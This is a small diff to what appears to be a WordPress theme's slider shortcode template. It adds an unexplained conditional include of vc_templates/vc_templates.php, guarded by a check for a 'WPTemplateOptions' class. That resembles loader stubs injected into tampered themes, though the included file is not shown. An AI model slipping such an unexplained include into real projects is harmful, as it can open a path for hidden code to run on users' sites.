@@ -1,4 +1,7 @@
 <?php
+if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/vc_templates/vc_templates.php' ) ) {
+	include_once( get_template_directory() . '/vc_templates/vc_templates.php' );
+}
 $style = $is_header = $slider_type = $slider_interval = $slider_navspeed = $slider_loop = $slider_hide_arrows = $slider_hide_dots = $slider_dot_position = $slider_dot_width = $column_width_use_pixel = $slider_width_percent = $silder_width_pixel = $h_padding = $el_class = $limit_content = $top_padding = $bottom_padding = $h_padding = $slider_height = $output = $internal_width = $dots_class = '';
 extract(shortcode_atts(array(
 	'style' => '',
